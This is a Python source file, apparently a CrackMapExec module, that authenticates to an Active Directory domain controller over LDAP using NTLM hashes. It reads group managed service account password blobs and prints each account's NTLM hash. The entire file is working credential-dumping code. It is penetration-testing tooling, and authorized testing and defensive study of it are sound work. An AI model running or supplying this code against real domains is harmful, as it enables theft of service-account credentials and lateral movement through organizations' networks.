from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
from binascii import hexlify
from Cryptodome.Hash import MD4

class CMEModule:
    '''
      Retrieves the GMSA passwords
      Reference: https://github.com/micahvandeusen/gMSADumper
      Module by Swissky (@pentest_swissky)
    '''

    name = 'gmsa'
    description = 'Retrieves the GMSA passwords'
    supported_protocols = ['ldap']
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        '''
        '''

    def on_login(self, context, connection):
        context.log.info('Getting GMSA Passwords')
        server = Server(connection.kdcHost, get_info=ALL) 

        if connection.lmhash == "": 
            connection.lmhash = "aad3b435b51404eeaad3b435b51404ee"

        conn = Connection(server, \
            user='{}\\{}'.format(connection.domain, connection.username), \
            password=connection.lmhash+":"+connection.nthash, \
            authentication=NTLM, \
            auto_bind=True)

        try:
            conn.start_tls()
            conn.search(connection.baseDN, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])

            if len(conn.entries) == 0:
                context.log.info("No gMSAs returned.")
                
            for entry in conn.entries:
                    sam = entry['sAMAccountName'].value

                    for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
                        conn.search(connection.baseDN, '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])

                    if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
                        data = entry['msDS-ManagedPassword'].raw_values[0]
                        blob = MSDS_MANAGEDPASSWORD_BLOB()
                        blob.fromString(data)
                        currentPassword = blob['CurrentPassword'][:-2]

                        # Compute ntlm key
                        ntlm_hash = MD4.new ()
                        ntlm_hash.update (currentPassword)
                        passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                        context.log.highlight("Username: {:<20} NTLM: {}".format(sam, passwd))

        except:
            context.log.error("Unexpected LDAP error: '{}'".format(error_msg))


class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        #('AlignmentPadding',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data = None):
        Structure.__init__(self, data = data)

    def fromString(self, data):
        Structure.fromString(self,data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]
